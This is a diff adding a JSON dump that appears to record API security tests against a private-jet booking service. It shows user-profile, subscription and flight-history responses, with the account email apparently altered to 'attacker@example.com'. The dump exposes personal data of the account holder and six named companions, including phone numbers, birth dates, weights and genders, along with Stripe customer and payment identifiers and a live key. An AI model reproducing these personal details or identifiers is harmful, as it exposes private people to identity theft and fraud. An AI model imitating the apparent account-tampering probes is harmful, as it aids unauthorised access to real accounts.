+            "website": null,
+            "code": "KPGV",
+            "codeFaa": null
+          },
+          "departFbo": {
+            "id": 446,
+            "name": "KUHN JET CENTER",
+            "uuid": "c9c6dcb6-f001-11ed-82b1-1e8adba15a41",
+            "phoneNumber": "703-665-3000",
+            "emailAddress": "info@kuhnaviation.com",
+            "website": "https://www.kuhnaviation.com/jet-center/",
+            "addressLine1": "959 SYCOLIN RD.",
+            "addressLine2": null,
+            "city": "LEESBURG",
+            "province": "Virginia",
+            "postalCode": null,
+            "countryCode": "US",
+            "airport": null
+          },
+          "arriveFbo": {
+            "id": 746,
+            "name": "MORGANTOWN MUNICIPAL FBO",
+            "uuid": "00089e8c-5efe-48a9-9ad0-f453ad926580",
+            "phoneNumber": "304 296 2359",
+            "emailAddress": "fbomgw@morgantownwv.gov",
+            "website": null,
+            "addressLine1": "100 Hart Field Road Morgantown, WV 26505",
+            "addressLine2": null,
+            "city": "GREENVILLE",
+            "province": "NC",
+            "postalCode": null,
+            "countryCode": "US",
+            "airport": null
+          },
+          "arriveDateTime": "2025-11-04T20:16:00.000Z",
+          "userData": {
+            "action": "NO_ACTION"
+          }
+        }
+      ],
+      "pagination": {
+        "limit": 10,
+        "nextCursor": "eyJkZXBhcnREYXRlVGltZSI6IjIwMjUtMTEtMDRUMTc6NDY6MDAuMDAwWiIsImlkIjo4NzkyLCJsaW1pdCI6MTB9",
+        "total": 258,
+        "recentFlightsTotal": 59,
+        "recentFlightsLookbackDays": 7,
+        "pastFlightsLookbackDays": 30
+      }
+    },
+    "Current Flights": [],
+    "Passenger Data": [],
+    "Person Data": [
+      {
+        "createdAt": 1712033928424,
+        "updatedAt": 1712033928424,
+        "id": 500,
+        "phoneNumber": "+17203944170",
+        "email": null,
+        "firstName": "Varun",
+        "middleName": "",
+        "lastName": "",
+        "dateOfBirth": null,
+        "weight": null,
+        "gender": null,
+        "user": 20254
+      },
+      {
+        "createdAt": 1714685311212,
+        "updatedAt": 1714685311212,
+        "id": 775,
+        "phoneNumber": "+13039076708",
+        "email": "",
+        "firstName": "Arjun",
+        "middleName": "",
+        "lastName": "Gosal",
+        "dateOfBirth": "1987-12-07",
+        "weight": 180,
+        "gender": "Male",
+        "user": 20254
+      },
+      {
+        "createdAt": 1715231549968,
+        "updatedAt": 1715378743257,
+        "id": 815,
+        "phoneNumber": "+18702246224",
+        "email": "",
+        "firstName": "Julian",
+        "middleName": "",
+        "lastName": "Jackson",
+        "dateOfBirth": "1996-08-15",
+        "weight": 110,
+        "gender": "Male",
+        "user": 20254
+      },
+      {
+        "createdAt": 1757720563083,
+        "updatedAt": 1757720563083,
+        "id": 2281,
+        "phoneNumber": "+19709855728",
+        "email": "",
+        "firstName": "Chauncey",
+        "middleName": "",
+        "lastName": "Barnett",
+        "dateOfBirth": "1989-02-16",
+        "weight": 240,
+        "gender": "Male",
+        "user": 20254
+      },
+      {
+        "createdAt": 1757720597940,
+        "updatedAt": 1757720597940,
+        "id": 2282,
+        "phoneNumber": "+18627661900",
+        "email": "",
+        "firstName": "Amory",
+        "middleName": "",
+        "lastName": "Creary",
+        "dateOfBirth": "1995-08-24",
+        "weight": 230,
+        "gender": "Male",
+        "user": 20254
+      },
+      {
+        "createdAt": 1757720630494,
+        "updatedAt": 1757720630494,
+        "id": 2283,
+        "phoneNumber": "",
+        "email": "",
+        "firstName": "Ashley",
+        "middleName": "",
+        "lastName": "Rager Trochez",
+        "dateOfBirth": "1997-02-04",
+        "weight": 150,
+        "gender": "Female",
+        "user": 20254
+      }
+    ]
+  },
+  "all_tests": [
+    {
+      "category": "baseline",
+      "test": "User Profile",
+      "endpoint": "/v1/user/",
+      "status": 200,
+      "response": {
+        "sweepstakesEntries": [],
+        "createdAt": 1710825847458,
+        "updatedAt": 1762363555375,
+        "id": 20254,
+        "phoneNumber": "+13035234453",
+        "email": "attacker@example.com",
+        "confirmedEmail": "sameer.s.chopra@gmail.com",
+        "priorityScore": 1931577847,
+        "firstName": "Sameer",
+        "middleName": "",
+        "lastName": "Chopra",
+        "dateOfBirth": "1991-08-14",
+        "weight": 140,
+        "gender": "Male",
+        "isCarbonOffsetEnrolled": true,
+        "successfulReferralCount": 0,
+        "lastFlightPurchase": null,
+        "eulaVersion": null,
+        "isEulaAccepted": false,
+        "hasStripePaymentDetails": false,
+        "stripeCustomerId": "cus_PlS5D89fzdDYgF",
+        "stripeSubscriptionId": null,
+        "stripeSubscriptionPaymentIntentId": null,
+        "stripeFlightPurchasePaymentIntentId": null,
+        "subscriptionStartDate": 1760700980000,
+        "subscriptionRenewalDate": 1830297600000,
+        "lastActivityAt": 1762307406434,
+        "referralKey": "nBBMuS",
+        "smsOptIn": true,
+        "emailOptIn": true,
+        "trackingOptIn": false,
+        "isFlightNotificationEnabled": true,
+        "isAllFlightsNotificationEnabled": true,
+        "androidAppVersion": "1.1.40",
+        "androidBuildNumber": 183,
+        "iosAppVersion": "1.1.40",
+        "iosBuildNumber": 219,
+        "abandonedRegReminderSent": false,
+        "license": {
+          "createdAt": 1760700980000,
+          "updatedAt": 1760746044256,
+          "id": 3050,
+          "uuid": "b7d49fc6-cd3e-4560-b100-08edf4d3b922",
+          "expiresAt": 1830297600000,
+          "isAssigned": true,
+          "stripeSubscriptionId": null,
+          "preferredStripeCreationDate": 1798761600000,
+          "membershipTier": {
+            "id": 2,
+            "name": "cabin+",
+            "priorityLevel": 2
+          },
+          "account": null,
+          "user": 20254,
+          "licenseRefund": null
+        },
+        "account": null,
+        "subscriptionStatus": 3,
+        "waitlistUpgrades": [
+          {
+            "createdAt": 1711138021682,
+            "updatedAt": 1713541686134,
+            "id": 456,
+            "costToUse": 149500,
+            "customAmount": null,
+            "stripePaymentIntentId": null,
+            "usedOn": null,
+            "priorityUpgradeTier": {
+              "id": 1,
+              "name": "base",
+              "priorityLevel": 1,
+              "stripePriceId": "price_1QDDF5BkrWmvysmujrEHAbSh"
+            },
+            "user": 20254,
+            "expiresOn": -1
+          },
+          {
+            "createdAt": 1711138021682,
+            "updatedAt": 1746829193471,
+            "id": 896,
+            "costToUse": 0,
+            "customAmount": null,
+            "stripePaymentIntentId": "in_1RMzGkBkrWmvysmuux7aAe55",
+            "usedOn": null,
+            "priorityUpgradeTier": {
+              "id": 2,
+              "name": "base_free",
+              "priorityLevel": 1,
+              "stripePriceId": null
+            },
+            "user": 20254,
+            "expiresOn": -1
+          },
+          {
+            "createdAt": 1742705161901,
+            "updatedAt": 1742705161902,
+            "id": 5484,
+            "costToUse": 149500,
+            "customAmount": null,
+            "stripePaymentIntentId": null,
+            "usedOn": null,
+            "priorityUpgradeTier": {
+              "id": 1,
+              "name": "base",
+              "priorityLevel": 1,
+              "stripePriceId": "price_1QDDF5BkrWmvysmujrEHAbSh"
+            },
+            "user": 20254,
+            "expiresOn": -1
+          },
+          {
+            "createdAt": 1746886000226,
+            "updatedAt": 1746886000226,
+            "id": 5978,
+            "costToUse": 0,
+            "customAmount": null,
+            "stripePaymentIntentId": null,
+            "usedOn": null,
+            "priorityUpgradeTier": {
+              "id": 2,
+              "name": "base_free",
+              "priorityLevel": 1,
+              "stripePriceId": null
+            },
+            "user": 20254,
+            "expiresOn": -1
+          },
+          {
+            "createdAt": 1761856740189,
+            "updatedAt": 1761864095757,
+            "id": 7756,
+            "costToUse": 0,
+            "customAmount": null,
+            "stripePaymentIntentId": "in_1SO2csBkrWmvysmuy0WfLjp3",
+            "usedOn": 1761864095757,
+            "priorityUpgradeTier": {
+              "id": 4,
+              "name": "cabin+_free",
+              "priorityLevel": 2,
+              "stripePriceId": null
+            },
+            "user": 20254,
+            "expiresOn": -1
+          }
+        ],
+        "termsStatus": {
+          "TermsAndConditions": {
+            "requiresAcceptance": false,
+            "currentVersion": "1.1",
+            "lastAcceptedVersion": "1.1",
+            "lastAcceptedDate": 1756848451030
+          },
+          "PrivacyPolicy": {
+            "requiresAcceptance": false,
+            "currentVersion": "1.1",
+            "lastAcceptedVersion": "1.1",
+            "lastAcceptedDate": 1756848451047
+          }
+        }
+      }
+    },
+    {
+      "category": "baseline",
+      "test": "Subscription",
+      "endpoint": "/v1/subscription/pk",
+      "status": 200,
+      "response": {
+        "pk": "pk_live_51Is7UdBkrWmvysmuX4hyzaPiAKfXxkFvYabmpKe6igGDXdUjT9nL4bJRyS4ngfKw6SwqpmEoxrP3vU8GwBBHkwMr00GkDgedAF"
+      }
+    },
+    {
+      "category": "baseline",
+      "test": "Payment Method",
+      "endpoint": "/v1/user/checkStripePaymentMethod",
+      "status": 200,
+      "response": {
+        "hasPaymentMethod": false,
+        "cards": []
+      }
+    },
+    {
+      "category": "baseline",
+      "test": "Flight History",
+      "endpoint": "/v1/flight-history",
+      "status": 200,
+      "response": {
+        "data": [
+          {
+            "id": 8796,
+            "uuid": "ee28b4f5-974d-4a44-b103-cd8ebd21a477",
+            "departDateTime": "2025-11-05T16:24:00.000Z",
+            "departDateTimeLocal": "2025-11-05T10:24",
+            "deletedAt": null,
+            "updatedAt": 1762300715760,
+            "closeoutDateTime": "2025-11-04T23:00:00.000Z",
+            "bannerUrl": "https://volatostorage.blob.core.windows.net/cities/e46a77c5-f885-4a12-8253-4562a9fad441.png",
+            "isConfirmedByWinner": true,
+            "status": 2,
+            "numberOfEntrants": 3,
+            "tierClassification": "cabin+",
+            "winner": 136548,
+            "aircraft": {
+              "id": 145,
+              "tail": "N391JS",
+              "type": 13
+            },
+            "departAirport": {
+              "id": 32,
+              "name": "Nashville International Airport",
+              "codeIcao": "KBNA",
+              "codeIata": "BNA",
+              "latitude": 36.12450027,
+              "longitude": -86.67819977,
+              "addressLine1": null,
+              "addressLine2": null,
+              "city": "Nashville",
+              "provinceCode": "TN",
+              "postalCode": null,
+              "countryCode": "US",
+              "website": null,
+              "code": "KBNA",
+              "codeFaa": null
+            },
+            "arriveAirport": {
+              "id": 273,
+              "name": "Dupage Airport",
+              "codeIcao": "KDPA",
+              "codeIata": "DPA",
+              "latitude": 41.90779877,
+              "longitude": -88.24859619,
+              "addressLine1": null,
+              "addressLine2": null,
+              "city": "Chicago/West Chicago",
+              "provinceCode": "IL",
+              "postalCode": null,
+              "countryCode": "US",
+              "website": "http://www.dupageairport.com/",
+              "code": "KDPA",
+              "codeFaa": null
+            },
+            "departFbo": {
+              "id": 753,
+              "name": "SIGNATURE FLIGHT SUPPORT",
+              "uuid": "78106677-ee44-4d27-b261-c9891713e81a",
+              "phoneNumber": "615 361 3000",
+              "emailAddress": "bna@signatureflight.com",
+              "website": null,
+              "addressLine1": "767 Hangar Lane Nashville, TN 37217",
+              "addressLine2": null,
+              "city": "NASHVILLE",
+              "province": "TN",
+              "postalCode": null,
+              "countryCode": "US",
+              "airport": null
+            },
+            "arriveFbo": {
+              "id": 547,
+              "name": "DUPAGE FLIGHT CENTER",
+              "uuid": "c9c7685b-f001-11ed-82b1-1e8adba15a41",
+              "phoneNumber": "630-208-5600",
+              "emailAddress": "dfcfuel@dupageairport.com",
+              "website": "http://www.dupageflightcenter.com/",
+              "addressLine1": "2700 INTERNATIONAL DR",
+              "addressLine2": null,
+              "city": "CHICAGO",
+              "province": "Illinois",
+              "postalCode": null,
+              "countryCode": "US",
+              "airport": null
+            },
+            "arriveDateTime": "2025-11-05T18:54:00.000Z",
+            "userData": {
+              "action": "NO_ACTION"
+            }
+          },
+          {
+            "id": 8804,
+            "uuid": "bbaa691d-156c-40d8-bf76-6f64d271a56e",
+            "departDateTime": "2025-11-05T16:12:00.000Z",
+            "departDateTimeLocal": "2025-11-05T11:12",
+            "deletedAt": null,
+            "updatedAt": 1762360226940,
+            "closeoutDateTime": "2025-11-04T23:40:00.000Z",
+            "bannerUrl": "https://volatostorage.blob.core.windows.net/cities/aeda094e-af0f-49c5-b36a-b9b0602f9bc4.png",
+            "isConfirmedByWinner": true,
+            "status": 2,
+            "numberOfEntrants": 2,
+            "tierClassification": "cabin+",
+            "winner": 114594,
+            "aircraft": {
+              "id": 107,
+              "tail": "N461MC",
+              "type": 15
+            },
+            "departAirport": {
+              "id": 123,
+              "name": "Fort Lauderdale Executive Airport",
+              "codeIcao": "KFXE",
+              "codeIata": "FXE",
+              "latitude": 26.19729996,
+              "longitude": -80.17070007,
+              "addressLine1": null,
+              "addressLine2": null,
+              "city": "Fort Lauderdale",
+              "provinceCode": "FL",
+              "postalCode": null,
+              "countryCode": "US",
+              "website": "http://www.fortlauderdale.gov/fxE/index.htm",
+              "code": "KFXE",
+              "codeFaa": null
+            },
+            "arriveAirport": {
+              "id": 837,
+              "name": "Boca Raton Airport",
+              "codeIcao": "KBCT",
+              "codeIata": "BCT",
+              "latitude": 26.37849998,
+              "longitude": -80.10769653,
+              "addressLine1": null,
+              "addressLine2": null,
+              "city": "Boca Raton",
+              "provinceCode": "FL",
+              "postalCode": null,
+              "countryCode": "US",
+              "website": null,
+              "code": "KBCT",
+              "codeFaa": null
+            },
+            "departFbo": {
+              "id": 219,
+              "name": "ATLANTIC AVIATION",
+              "uuid": "c9c79b69-f001-11ed-82b1-1e8adba15a41",
+              "phoneNumber": "954-772-7444",
+              "emailAddress": "",
+              "website": "",
+              "addressLine1": "1020 NW 62nd St",
+              "addressLine2": null,
+              "city": "Fort Lauderdale",
+              "province": "Florida",
+              "postalCode": null,
+              "countryCode": "US",
+              "airport": null
+            },
+            "arriveFbo": {
+              "id": 55,
+              "name": "ATLANTIC AVIATION",
+              "uuid": "c9c72ede-f001-11ed-82b1-1e8adba15a41",
+              "phoneNumber": "561-368-1110",
+              "emailAddress": "bctfrontdesk@atlanticaviation.com",
+              "website": "http://www.atlanticaviation.com/location/bct",
+              "addressLine1": "3700 AIRPORT RD",
+              "addressLine2": null,
+              "city": "BOCA RATON",
+              "province": "Florida",
+              "postalCode": null,
+              "countryCode": "US",
+              "airport": null
+            },
+            "arriveDateTime": "2025-11-05T18:42:00.000Z",
+            "userData": {
+              "action": "NO_ACTION"
+            }
+          },
+          {
+            "id": 8795,
+            "uuid": "ae2ddc55-7d2c-4db8-8a1f-208f1b606aa2",
+            "departDateTime": "2025-11-05T16:05:00.000Z",
+            "departDateTimeLocal": "2025-11-05T11:05",
+            "deletedAt": null,
+            "updatedAt": 1762360203142,
+            "closeoutDateTime": "2025-11-04T23:00:00.000Z",
+            "bannerUrl": "https://volatostorage.blob.core.windows.net/cities/207373ad-5179-4f3f-9f50-270ae9699bf1.png",
+            "isConfirmedByWinner": true,
+            "status": 2,
+            "numberOfEntrants": 7,
+            "tierClassification": "cabin+",
+            "winner": 26927,
+            "aircraft": {
+              "id": 144,
+              "tail": "N390JS",
+              "type": 13
+            },
+            "departAirport": {
+              "id": 31,
+              "name": "Tampa International Airport",
+              "codeIcao": "KTPA",
+              "codeIata": "TPA",
+              "latitude": 27.97550011,
+              "longitude": -82.53320313,
+              "addressLine1": null,
+              "addressLine2": null,
+              "city": "Tampa",
+              "provinceCode": "FL",
+              "postalCode": null,
+              "countryCode": "US",
+              "website": null,
+              "code": "KTPA",
+              "codeFaa": null
+            },
+            "arriveAirport": {
+              "id": 128,
+              "name": "Kissimmee Gateway Airport",
+              "codeIcao": "KISM",
+              "codeIata": "ISM",
+              "latitude": 28.28980064,
+              "longitude": -81.43710327,
+              "addressLine1": null,
+              "addressLine2": null,
+              "city": "Orlando",
+              "provinceCode": "FL",
+              "postalCode": null,
+              "countryCode": "US",
+              "website": "http://www.kissimmee.org/index.aspx?page=111",
+              "code": "KISM",
+              "codeFaa": null
+            },
+            "departFbo": {
+              "id": 751,
+              "name": "Signature - TPA",
+              "uuid": "f884c6c8-bebf-4a2e-a365-d8c8b64f3fb2",
+              "phoneNumber": "813 870 3813",
+              "emailAddress": "TPA@signatureflight.com",
+              "website": null,
+              "addressLine1": "2450 N Westshore Blvd Tampa, FL 33607",
+              "addressLine2": null,
+              "city": "TAMPA",
+              "province": "FL",
+              "postalCode": null,
+              "countryCode": "US",
+              "airport": null
+            },
+            "arriveFbo": {
+              "id": 752,
+              "name": "SIGNATURE FLIGHT SUPPORT",
+              "uuid": "a0b15d2d-c57c-4ad8-ba0a-a4ee236ec68e",
+              "phoneNumber": "407 846 6128",
+              "emailAddress": "ism@signatureflight.com",
+              "website": null,
+              "addressLine1": "201 Dyer Blvd Kissimmee, FL 34741",
+              "addressLine2": null,
+              "city": "ORLANDO",
+              "province": "FL",
+              "postalCode": null,
+              "countryCode": "US",
+              "airport": null
+            },
+            "arriveDateTime": "2025-11-05T18:35:00.000Z",
+            "userData": {
+              "action": "NO_ACTION"
+            }
+          },
+          {
+            "id": 8803,
+            "uuid": "948cd323-6e21-4a09-8e26-a9ad63b8f0fe",
+            "departDateTime": "2025-11-05T14:15:00.000Z",
+            "departDateTimeLocal": "2025-11-05T09:15",
+            "deletedAt": null,
+            "updatedAt": 1762354798742,
+            "closeoutDateTime": "2025-11-04T23:40:00.000Z",
+            "bannerUrl": "https://volatostorage.blob.core.windows.net/cities/345e4c45-39ed-40ec-9e92-48597a45ff77.png",
+            "isConfirmedByWinner": true,
+            "status": 2,
+            "numberOfEntrants": 1,
+            "tierClassification": "cabin+",
+            "winner": 111610,
+            "aircraft": {
+              "id": 119,
+              "tail": "N198HB",
+              "type": 15
+            },
+            "departAirport": {
+              "id": 807,
+              "name": "Witham Field",
+              "codeIcao": "KSUA",
+              "codeIata": "SUA",
+              "latitude": 27.18169975,
+              "longitude": -80.22109985,
+              "addressLine1": null,
+              "addressLine2": null,
+              "city": "Stuart",
+              "provinceCode": "FL",
+              "postalCode": null,
+              "countryCode": "US",
+              "website": "http://ap3server.martin.fl.us/portal/page?_pageid=413,234422&_dad=portal&_schema=PORTAL",
+              "code": "KSUA",
+              "codeFaa": null
+            },
+            "arriveAirport": {
+              "id": 110,
+              "name": "St. Petersburg Clearwater International Airport",
+              "codeIcao": "KPIE",
+              "codeIata": "PIE",
+              "latitude": 27.9102,
+              "longitude": -82.687401,
+              "addressLine1": null,
+              "addressLine2": null,
+              "city": "Pinellas Park",
+              "provinceCode": "FL",
+              "postalCode": null,
+              "countryCode": "US",
+              "website": null,
+              "code": "KPIE",
+              "codeFaa": null
+            },
+            "departFbo": {
+              "id": 524,
+              "name": "ATLANTIC AVIATION",
+              "uuid": "c9c6dc15-f001-11ed-82b1-1e8adba15a41",
+              "phoneNumber": "772-288-6700",
+              "emailAddress": "suafrontdesk@atlanticaviation.com",
+              "website": "http://www.atlanticaviation.com",
+              "addressLine1": "2501 SE AVIATION WAY",
+              "addressLine2": null,
+              "city": "STUART",
+              "province": "Florida",
+              "postalCode": null,
+              "countryCode": "US",
+              "airport": null
+            },
+            "arriveFbo": {
+              "id": 74,
+              "name": "SHELTAIR AVIATION SERVICES",
+              "uuid": "c9c78b1d-f001-11ed-82b1-1e8adba15a41",
+              "phoneNumber": "727-530-3453",
+              "emailAddress": "info-pie@sheltairaviation.com",
+              "website": "https://sheltairaviation.com/fbos/pie-clearwater-fl/",
+              "addressLine1": "15875 FAIRCHILD DRIVE",
+              "addressLine2": null,
+              "city": "CLEARWATER",
+              "province": "Florida",
+              "postalCode": null,
+              "countryCode": "US",
+              "airport": null
+            },
+            "arriveDateTime": "2025-11-05T16:45:00.000Z",
+            "userData": {
+              "action": "NO_ACTION"
+            }
+          },
+          {
+            "id": 8802,
+            "uuid": "4fa5bc71-6119-4f37-8cc8-177b6eeeb56b",
+            "departDateTime": "2025-11-05T12:36:00.000Z",
+            "departDateTimeLocal": "2025-11-05T07:36",
+            "deletedAt": null,
+            "updatedAt": 1762351494936,
+            "closeoutDateTime": "2025-11-04T23:40:00.000Z",
+            "bannerUrl": "https://volatostorage.blob.core.windows.net/cities/e09622a6-ce7c-4a7c-b96b-81c811bbb70d.png",
+            "isConfirmedByWinner": true,
+            "status": 2,
+            "numberOfEntrants": 4,
+            "tierClassification": "cabin+",
+            "winner": 93101,
+            "aircraft": {
+              "id": 116,
+              "tail": "N317MP",
+              "type": 15
+            },
+            "departAirport": {
+              "id": 61,
+              "name": "Orlando Sanford International Airport",
+              "codeIcao": "KSFB",
+              "codeIata": "SFB",
+              "latitude": 28.77759933,
+              "longitude": -81.23750305,
+              "addressLine1": null,
+              "addressLine2": null,
+              "city": "Orlando",
+              "provinceCode": "FL",
+              "postalCode": null,
+              "countryCode": "US",
+              "website": null,
+              "code": "KSFB",
+              "codeFaa": null
+            },
+            "arriveAirport": {
+              "id": 103,
+              "name": "Piedmont Triad International Airport",
+              "codeIcao": "KGSO",
+              "codeIata": "GSO",
+              "latitude": 36.097801,
+              "longitude": -79.937302,
+              "addressLine1": null,
+              "addressLine2": null,
+              "city": "Greensboro",
+              "provinceCode": "NC",
+              "postalCode": null,
+              "countryCode": "US",
+              "website": null,
+              "code": "KGSO",
+              "codeFaa": null
+            },
+            "departFbo": {
+              "id": 142,
+              "name": "MILLION AIR",
+              "uuid": "c9c975c7-f001-11ed-82b1-1e8adba15a41",
+              "phoneNumber": "407-585-6300",
+              "emailAddress": "info.sfb@millionair.com",
+              "website": "http://www.millionair.com/sfb.aspx",
+              "addressLine1": "2841 FLIGHT LINE AVE",
+              "addressLine2": null,
+              "city": "SANFORD",
+              "province": "Florida",
+              "postalCode": null,
+              "countryCode": "US",
+              "airport": null
+            },
+            "arriveFbo": {
+              "id": 64,
+              "name": "KOURY AVIATION",
+              "uuid": "c9c69b87-f001-11ed-82b1-1e8adba15a41",
+              "phoneNumber": "336-279-7996",
+              "emailAddress": "frontdesk@kouryaviation.com",
+              "website": "http://www.kouryprivatejetcharter.com",
+              "addressLine1": "7680 AIRLINE ROAD",
+              "addressLine2": null,
+              "city": "GREENSBORO",
+              "province": "North Carolina",
+              "postalCode": null,
+              "countryCode": "US",
+              "airport": null
+            },
+            "arriveDateTime": "2025-11-05T15:06:00.000Z",
+            "userData": {
+              "action": "NO_ACTION"
+            }
+          },
+          {
+            "id": 8801,
+            "uuid": "547b9f77-d803-4bf1-ace7-fcc267c88fe4",
+            "departDateTime": "2025-11-05T12:15:00.000Z",
+            "departDateTimeLocal": "2025-11-05T07:15",
+            "deletedAt": null,
+            "updatedAt": 1762299776451,
+            "closeoutDateTime": "2025-11-04T23:40:00.000Z",
+            "bannerUrl": "https://volatostorage.blob.core.windows.net/cities/d5b4de7d-76de-4ba3-b41c-9860e73e0a5f.png",
+            "isConfirmedByWinner": false,
+            "status": 2,
+            "numberOfEntrants": 0,
+            "tierClassification": "cabin+",
+            "winner": null,
+            "aircraft": {
+              "id": 118,
+              "tail": "N975LV",
+              "type": 15
+            },
+            "departAirport": {
+              "id": 185,
+              "name": "Vero Beach Regional Airport",
+              "codeIcao": "KVRB",
+              "codeIata": "VRB",
+              "latitude": 27.6556,
+              "longitude": -80.417901,
+              "addressLine1": null,
+              "addressLine2": null,
+              "city": "Vero Beach",
+              "provinceCode": "FL",
+              "postalCode": null,
+              "countryCode": "US",
+              "website": "http://verobeachairport.org/",
+              "code": "KVRB",
+              "codeFaa": null
+            },
+            "arriveAirport": {
+              "id": 102,
+              "name": "Teterboro Airport",
+              "codeIcao": "KTEB",
+              "codeIata": "TEB",
+              "latitude": 40.85010147,
+              "longitude": -74.06079865,
+              "addressLine1": null,
+              "addressLine2": null,
+              "city": "Teterboro",
+              "provinceCode": "NJ",
+              "postalCode": null,
+              "countryCode": "US",
+              "website": "http://www.teb.com/",
+              "code": "KTEB",
+              "codeFaa": null
+            },
+            "departFbo": {
+              "id": 761,
+              "name": "CORPORATE AIR INC",
+              "uuid": "266278ce-2736-4463-9dac-712e23e3ff7d",
+              "phoneNumber": "772 562 1199",
+              "emailAddress": null,
+              "website": null,
+              "addressLine1": "3450B Airport West Dr Vero Beach, FL 32960",
+              "addressLine2": null,
+              "city": "VERO BEACH",
+              "province": "FL",
+              "postalCode": null,
+              "countryCode": "US",
+              "airport": null
+            },
+            "arriveFbo": {
+              "id": 60,
+              "name": "ATLANTIC AVIATION",
+              "uuid": "c9c6e647-f001-11ed-82b1-1e8adba15a41",
+              "phoneNumber": "201-288-1740",
+              "emailAddress": "tebfrontdesk@atlanticaviation.com",
+              "website": "http://www.atlanticaviation.com",
+              "addressLine1": "233 INDUSTRIAL AVENUE",
+              "addressLine2": null,
+              "city": "TETERBORO",
+              "province": "New Jersey",
+              "postalCode": null,
+              "countryCode": "US",
+              "airport": null
+            },
+            "arriveDateTime": "2025-11-05T14:45:00.000Z",
+            "userData": {
+              "action": "NO_ACTION"
+            }
+          },
+          {
+            "id": 8794,
+            "uuid": "a350f63d-0dfe-4611-95ac-79a042789986",
+            "departDateTime": "2025-11-04T19:49:00.000Z",
+            "departDateTimeLocal": "2025-11-04T11:49",
+            "deletedAt": null,
+            "updatedAt": 1762288431695,
+            "closeoutDateTime": "2025-11-03T22:20:00.000Z",
+            "bannerUrl": "https://volatostorage.blob.core.windows.net/cities/4e39eb8a-0442-4d07-bb85-909f2292e654.png",
+            "isConfirmedByWinner": true,
+            "status": 2,
+            "numberOfEntrants": 3,
+            "tierClassification": "cabin+",
+            "winner": 27,
+            "aircraft": {
+              "id": 63,
+              "tail": "N810JS",
+              "type": 14
+            },
+            "departAirport": {
+              "id": 95,
+              "name": "Santa Barbara Municipal Airport",
+              "codeIcao": "KSBA",
+              "codeIata": "SBA",
+              "latitude": 34.42620087,
+              "longitude": -119.8399963,
+              "addressLine1": null,
+              "addressLine2": null,
+              "city": "Santa Barbara",
+              "provinceCode": "CA",
+              "postalCode": null,
+              "countryCode": "US",
+              "website": null,
+              "code": "KSBA",
+              "codeFaa": null
+            },
+            "arriveAirport": {
+              "id": 26,
+              "name": "San Diego International Airport",
+              "codeIcao": "KSAN",
+              "codeIata": "SAN",
+              "latitude": 32.73360062,
+              "longitude": -117.1900024,
+              "addressLine1": null,
+              "addressLine2": null,
+              "city": "San Diego",
+              "provinceCode": "CA",
+              "postalCode": null,
+              "countryCode": "US",
+              "website": "http://www.san.org/",
+              "code": "KSAN",
+              "codeFaa": null
+            },
+            "departFbo": {
+              "id": 749,
+              "name": "SIGNATURE FLIGHT SUPPORT",
+              "uuid": "b4100a3d-64ec-4599-a697-427b04d47100",
+              "phoneNumber": "805 967 5608",
+              "emailAddress": null,
+              "website": null,
+              "addressLine1": "515 Marxmiller Place Santa Barbara, CA 93117",
+              "addressLine2": null,
+              "city": "SANTA BARBARA",
+              "province": "CA",
+              "postalCode": null,
+              "countryCode": "US",
+              "airport": null
+            },
+            "arriveFbo": {
+              "id": 750,
+              "name": "SIGNATURE FLIGHT SUPPORT",
+              "uuid": "7cdfa960-5558-4ea2-b592-b491d3343e4a",
+              "phoneNumber": "619 298 7704",
+              "emailAddress": "san@signatureflight.com",
+              "website": null,
+              "addressLine1": "3300 Admiral Boland Way San Diego, CA 92101",
+              "addressLine2": null,
+              "city": "SAN DIEGO",
+              "province": "CA",
+              "postalCode": null,
+              "countryCode": "US",
+              "airport": null
+            },
+            "arriveDateTime": "2025-11-04T22:19:00.000Z",
+            "userData": {
+              "action": "NO_ACTION"
+            }
+          },
+          {
+            "id": 8790,
+            "uuid": "27782f87-e9b6-4246-bb21-1de8b8d7d556",
+            "departDateTime": "2025-11-04T19:30:00.000Z",
+            "departDateTimeLocal": "2025-11-04T14:30",
+            "deletedAt": null,
+            "updatedAt": 1762210828794,
+            "closeoutDateTime": "2025-11-03T23:00:00.000Z",
+            "bannerUrl": "https://volatostorage.blob.core.windows.net/cities/b543a535-182f-4e36-a266-51d943ce214d.png",
+            "isConfirmedByWinner": false,
+            "status": 2,
+            "numberOfEntrants": 0,
+            "tierClassification": "cabin+",
+            "winner": null,
+            "aircraft": {
+              "id": 140,
+              "tail": "N765JS",
+              "type": 22
+            },
+            "departAirport": {
+              "id": 840,
+              "name": "Marco Island Executive Airport",
+              "codeIcao": "KMKY",
+              "codeIata": "MRK",
+              "latitude": 25.995001,
+              "longitude": -81.672501,
+              "addressLine1": null,
+              "addressLine2": null,
+              "city": "Marco Island",
+              "provinceCode": "FL",
+              "postalCode": null,
+              "countryCode": "US",
+              "website": "http://www.colliergov.net/index.aspx?page=21",
+              "code": "KMKY",
+              "codeFaa": null
+            },
+            "arriveAirport": {
+              "id": 811,
+              "name": "Destin Executive Airport",
+              "codeIcao": "KDTS",
+              "codeIata": "DSI",
+              "latitude": 30.40010071,
+              "longitude": -86.47149658,
+              "addressLine1": null,
+              "addressLine2": null,
+              "city": "Destin",
+              "provinceCode": "FL",
+              "postalCode": null,
+              "countryCode": "US",
+              "website": "http://www.flydts.com/",
+              "code": "KDTS",
+              "codeFaa": null
+            },
+            "departFbo": {
+              "id": 745,
+              "name": "MARCO ISLAND EXEC AIRPORT",
+              "uuid": "432f75f4-a8b1-4c3a-88cc-a164c36944d3",
+              "phoneNumber": "239 252 1059",
+              "emailAddress": "marcocustomerservice@colliergov.net",
+              "website": null,
+              "addressLine1": "2005 Mainsail Dr, Ste 1 Naples, FL 34114",
+              "addressLine2": null,
+              "city": "MARCO ISLAND",
+              "province": "FL",
+              "postalCode": null,
+              "countryCode": "US",
+              "airport": null
+            },
+            "arriveFbo": {
+              "id": 31,
+              "name": "ATLANTIC AVIATION",
+              "uuid": "c9c6a207-f001-11ed-82b1-1e8adba15a41",
+              "phoneNumber": "850-424-6890",
+              "emailAddress": "dtsfrontdesk@atlanticaviation.com",
+              "website": "http://www.atlanticaviation.com",
+              "addressLine1": "1001 AIRPORT ROAD",
+              "addressLine2": null,
+              "city": "DESTIN",
+              "province": "Florida",
+              "postalCode": null,
+              "countryCode": "US",
+              "airport": null
+            },
+            "arriveDateTime": "2025-11-04T22:00:00.000Z",
+            "userData": {
+              "action": "NO_ACTION"
+            }
+          },
+          {
+            "id": 8787,
+            "uuid": "f973b99a-e3e3-4cfc-886a-9fcfd80442e1",
+            "departDateTime": "2025-11-04T18:45:00.000Z",
